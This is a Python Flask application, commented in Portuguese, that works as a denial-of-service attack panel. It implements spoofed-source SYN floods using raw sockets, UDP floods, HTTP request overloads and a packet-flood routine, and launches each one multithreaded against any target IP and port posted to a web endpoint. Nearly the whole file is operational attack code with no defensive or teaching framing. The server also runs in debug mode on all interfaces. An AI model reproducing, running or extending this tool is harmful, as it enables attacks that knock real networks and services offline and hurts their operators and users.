from flask import Flask, request, jsonify, render_template
import threading
import socket
import random
import time
import subprocess
import struct
import os

app = Flask(__name__)

# Variáveis globais para controlar a execução
attack_running = False

# Função para gerar IPs falsificados
def spoof_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Função para ataque SYN Flood com IPs falsificados
def attack_syn_flood(target_ip, port, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            spoofed_ip = spoof_ip()
            ip_header = struct.pack("!BBHHHBBH4s4s", 4, 5, 0, 0, 0, 64, 6, 0, socket.inet_aton(spoofed_ip), socket.inet_aton(target_ip))
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), port, random.randint(0, 65535), random.randint(0, 65535), 5, 2, random.randint(1000, 65535), 0, 0)
            packet = ip_header + tcp_header
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.sendto(packet, (target_ip, port))
            print(f"[SYN Flood] Sent spoofed SYN packet to {target_ip}:{port} from {spoofed_ip}")
        except Exception as e:
            print(f"[SYN Flood] Error: {e}")

# Função para ataque UDP Flood com fragmentação
def attack_udp_flood(target_ip, port, duration):
    global attack_running
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(2048)  # Pacote UDP maior
    while time.time() < end_time and attack_running:
        try:
            sock.sendto(packet, (target_ip, port))
            print(f"[UDP Flood] Sent UDP flood to {target_ip}:{port}")
        except Exception as e:
            print(f"[UDP Flood] Error: {e}")

# Função para ataques de Sobrecarga de Requisições HTTP (Saturação de Aplicações)
def attack_http_overload(target_ip, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            headers = [
                "GET / HTTP/1.1",
                f"Host: {target_ip}",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Connection: keep-alive",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Encoding: gzip, deflate, br",
                "Accept-Language: en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7"
            ]
            request_header = "\r\n".join(headers) + "\r\n\r\n"
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, 80))
            sock.send(request_header.encode())
            sock.close()
            print(f"[HTTP Overload] Sent HTTP overload packet to {target_ip}")
        except Exception as e:
            print(f"[HTTP Overload] Error: {e}")

# Função para ataque de Fragmentação de Pacotes
def attack_packet_fragmentation(target_ip, port, duration):
    global attack_running
    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        try:
            fragment_size = 512
            packet = random._urandom(fragment_size)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(packet, (target_ip, port))
            print(f"[Packet Fragmentation] Sent fragmented packet to {target_ip}:{port}")
        except Exception as e:
            print(f"[Packet Fragmentation] Error: {e}")

# Função de ataque com múltiplos threads
def start_attack_thread_mta(target_ip, port, duration, threads, attack_type):
    global attack_running
    attack_running = True
    if attack_type == "syn_flood":
        for _ in range(threads):
            threading.Thread(target=attack_syn_flood, args=(target_ip, port, duration)).start()
    elif attack_type == "udp_flood":
        for _ in range(threads):
            threading.Thread(target=attack_udp_flood, args=(target_ip, port, duration)).start()
    elif attack_type == "http_overload":
        for _ in range(threads):
            threading.Thread(target=attack_http_overload, args=(target_ip, duration)).start()
    elif attack_type == "packet_fragmentation":
        for _ in range(threads):
            threading.Thread(target=attack_packet_fragmentation, args=(target_ip, port, duration)).start()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    target_ip = data.get('target_ip')
    port = int(data.get('port'))
    threads = int(data.get('threads'))
    duration = int(data.get('duration'))
    attack_type = data.get('attack_type')

    threading.Thread(target=start_attack_thread_mta, args=(target_ip, port, duration, threads, attack_type)).start()

    return jsonify({"message": f"Attack '{attack_type}' started successfully!"})

@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    global attack_running
    attack_running = False
    return jsonify({"message": "Attack stopped!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
